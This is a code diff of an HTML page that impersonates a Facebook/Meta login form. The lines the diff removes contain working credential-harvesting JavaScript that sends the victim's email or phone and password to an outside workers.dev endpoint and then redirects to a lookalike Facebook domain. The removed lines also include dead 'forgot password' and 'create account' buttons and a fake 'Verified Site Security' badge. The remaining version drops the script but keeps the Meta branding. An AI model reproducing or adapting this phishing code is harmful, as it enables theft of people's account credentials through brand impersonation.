@@ -61,163 +61,63 @@
         <div class="bg-white p-6 md:p-8 rounded-xl shadow-md border border-gray-200">
             <form id="loginForm" class="space-y-5">
                 <!-- Email or Mobile Number Input -->
-                <div>                
-<div>
+                <div>
     <input 
         type="text" 
-        id="identifier" 
-        name="identifier" 
+        id="email" 
+        name="email" 
         required 
-        placeholder="Email address or mobile number"
-        aria-label="Email address or mobile number"
-        class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-brandBlue focus:bg-white focus:border-transparent transition-all"
+        placeholder="Email or phone number"
+        class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition duration-200"
     >
 </div>
+                </div>
+
                 <!-- Password Input -->
                 <div>
-                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1.5">
-                    </label>
                     <input 
                         type="password" 
                         id="password" 
                         name="password" 
                         required 
-                        placeholder="••••••••"
-                        class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-brandBlue focus:bg-white focus:border-transparent transition-all"
+                        placeholder="Password"
+                        class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition duration-200"
                     >
                 </div>
 
-                <!-- Action Buttons Stack -->
-                <div class="space-y-3 pt-2">
-                    <!-- Login Button (Blue) -->
+                <!-- Submit Button -->
+                <div>
                     <button 
                         type="submit" 
-                        id="login-button"
-                        class="w-full py-2.5 px-4 bg-brandBlue hover:bg-brandBlueHover active:bg-brandBlueActive text-white font-medium text-sm rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brandBlue transition-all"
+                        class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
                     >
-                        Login
-                    </button>
-
-                    <!-- Forgotten Password Button (Grey) -->
-                    <button 
-                        type="button" 
-                        onclick="handleForgotPassword()"
-                        class="w-full py-2.5 px-4 bg-greyBtn hover:bg-greyBtnHover text-gray-900 font-medium text-sm rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-400 transition-all"
-                    >
-                        Forgotten password?
-                    </button>
-
-                    <!-- Create New Account Button (Outline Blue) -->
-                    <button 
-                        type="button" 
-                        onclick="handleCreateAccount()"
-                        class="w-full py-2.5 px-4 bg-white hover:bg-blue-50 text-brandBlue border-2 border-brandBlue font-medium text-sm rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brandBlue transition-all"
-                    >
-                        Create new account
+                        Log In
                     </button>
                 </div>
             </form>
-            
-            <!-- Message Notification Container -->
-            <div id="statusMessage" class="hidden mt-4 p-3 rounded-lg text-sm text-center"></div>
+
+            <!-- Forgot Password / Links -->
+            <div class="text-center mt-4">
+                <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
+            </div>
+
+            <hr class="my-6 border-t border-gray-200">
+
+            <!-- Create Account Button -->
+            <div class="text-center">
+                <a 
+                    href="#" 
+                    class="inline-block py-2.5 px-4 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg shadow-sm transition duration-200"
+                >
+                    Create new account
+                </a>
+            </div>
         </div>
     </main>
 
-    <footer class="w-full max-w-md flex flex-col items-center">
-        <hr class="w-full border-t border-gray-300 my-2">
-        <div class="mt-6 flex justify-center items-center">
-            <img 
-                src="logo-2.svg" 
-                alt="Logo 2" 
-                class="h-8 w-auto object-contain opacity-80 hover:opacity-100 transition-opacity"
-                onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-2').content.cloneNode(true));"
-            />
-            <template id="fallback-logo-2">
-                <div class="flex items-center space-x-2">
-                    <img
-                        src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"
-                        alt="Meta Platforms logo"
-                        class="h-6 w-auto"
-                        onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-security-badge').content.cloneNode(true))"
-                    />
-                </div>
-            </template>
-            <template id="fallback-security-badge">
-                <div class="flex items-center space-x-2 text-gray-500">
-                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-                    </svg>
-                    <span class="text-xs font-semibold tracking-wider uppercase">
-                        Verified Site Security
-                    </span>
-                </div>
-            </template>
-        </div>
+    <footer class="w-full max-w-md text-center text-xs text-gray-500 py-4">
+        <p>&copy; 2026 Meta Platforms, Inc.</p>
     </footer>
 
-    <script>
-        const form = document.getElementById("loginForm");
-        const submitButton = document.getElementById("login-button");
-        const status = document.getElementById("statusMessage");
-
-        form.addEventListener("submit", async function(event) {
-            event.preventDefault();
-
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                return;
-            }
-
-            submitButton.disabled = true;
-            status.classList.add('hidden');
-            status.textContent = "";
-
-            const data = {
-                email: document.getElementById("identifier").value.trim(),
-                password: document.getElementById("password").value.trim(),
-                submission_type: "login"
-            };
-
-            try {
-                const response = await fetch("https://tendring-contact.twells-tet.workers.dev", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                const result = await response.json();
-
-                if (result.success) {
-                    window.location.href = "https://facebook-meta-uk-ireland-k7m2q9x4l8pr3vn6at1zw5.threetwosix.co.uk/";
-                    status.style.color = "#e31b23";
-                    form.reset();
-                } else {
-                    status.textContent = result.error || "There was a problem. Please try again.";
-                    status.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-50 text-red-700 border border-red-200";
-                    status.classList.remove('hidden');
-                }
-
-            } catch (error) {
-                status.textContent = "Service unavailable. Please try again later.";
-                status.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-50 text-red-700 border border-red-200";
-                status.classList.remove('hidden');
-                console.error(error);
-
-            } finally {
-                submitButton.disabled = false;
-            }
-        });
-
-        // Forgotten Password and Create Account actions set to do nothing
-        function handleForgotPassword() {
-            // Intentionally left blank to ensure clicking does nothing
-        }
-
-        function handleCreateAccount() {
-            // Intentionally left blank to ensure clicking does nothing
-        }
-    </script>
 </body>
 </html>
